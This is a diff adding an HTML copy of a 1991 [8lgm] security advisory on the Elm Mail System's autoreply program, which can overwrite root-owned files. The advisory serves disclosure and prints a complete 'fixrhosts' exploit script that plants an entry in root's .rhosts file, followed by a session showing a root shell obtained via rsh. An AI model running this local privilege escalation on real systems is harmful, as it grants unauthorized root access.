@@ -1,0 +1,115 @@
+<head>
+<title>[8lgm]-Advisory-2.UNIX.autoreply.12-Jul-1991</title>
+</head>
+<body>
+<hr>
+<H1>[8lgm]-Advisory-2.UNIX.autoreply.12-Jul-1991
+</H1>
+<P>
+<H2>PROGRAM:</H2>
+<P>
+<PRE>
+        autoreply(1)    (/usr/local/bin/autoreply)
+                        Supplied with the Elm Mail System
+</PRE>
+<P>
+<H2>VULNERABLE OS's:</H2>
+<P>
+        Any system with a standard installation of The Elm Mail System.
+        All versions are believed to have this vulnerability.
+<P>
+<H2>DESCRIPTION:</H2>
+<P>
+        autoreply(1) can be used to create root owned files, with mode 666.  
+  It can also overwrite any file with semi user-controlled
+        data.
+<P>
+<H2>IMPACT:</H2>
+<P>
+        Any user with access to autoreply(1) can alter system files and
+        thus become root.
+<P>
+<H2>REPEAT BY:</H2>
+<P>
+        This example demonstrates how to become root on most affected
+        machines by modifying root's .rhosts file.  Please do not do
+        this unless you have permission.
+<P>
+        Create the following script, 'fixrhosts':
+<P>
+<pre>
+8<--------------------------- cut here ----------------------------
+#!/bin/sh
+#
+# fixrhosts rhosts-file user machine
+#
+if [ $# -ne 3 ]; then
+        echo "Usage: `basename $0` rhosts-file user machine"
+        exit 1
+fi
+RHOSTS="$1"
+USERNAME="$2"
+MACHINE="$3"
+cd $HOME
+echo x > "a
+$MACHINE $USERNAME
+b"
+umask 022
+autoreply "a
+$MACHINE $USERNAME
+b"
+cat > /tmp/.rhosts.sh.$$ << 'EOF'
+ln -s $1 `echo $$ | awk '{printf "/tmp/arep.%06d", $1}'`
+exec autoreply off
+exit 0
+EOF
+/bin/sh /tmp/.rhosts.sh.$$ $RHOSTS
+rm -f /tmp/.rhosts.sh.$$ "a
+$MACHINE $USERNAME
+b"
+exit 0
+8<--------------------------- cut here ----------------------------
+</pre>
+<P>
+        (Lines marked with > represent user input)
+<P>
+<pre>
+>       % id
+        uid=97(8lgm) gid=97(8lgm) groups=97(8lgm)
+>       % ./fixrhosts ~root/.rhosts 8lgm localhost
+        You've been added to the autoreply system.
+        You've been removed from the autoreply table.
+>       % rsh localhost -l root csh -i
+        Warning: no access to tty.
+        Thus no job control in this shell.
+        # 
+</pre>
+<P>
+        
+<h2>FIX:</h2>
+<P>
+<OL>
+<li> Disable autoreply.
+<li> Wait for a patch from the Elm maintainers.
+</OL>
+<P>
+<P>
+<H2>FEEDBACK AND CONTACT INFORMATION:</H2>
+<P>
+<PRE>
+        8lgm-bugs@bagpuss.demon.co.uk           (To report security flaws)
+<P>
+        8lgm-request@bagpuss.demon.co.uk        (Request for [8lgm] Advisories)
+<P>
+        8lgm@bagpuss.demon.co.uk                (General enquiries)
+</PRE>
+<P>
+        System Administrators are encouraged to contact us for any
+        other information they may require about the problems described
+        in this advisory.
+<P>
+        We welcome reports about which platforms this flaw does or does
+        not exist on.
+<P>
+<hr>
+</body>
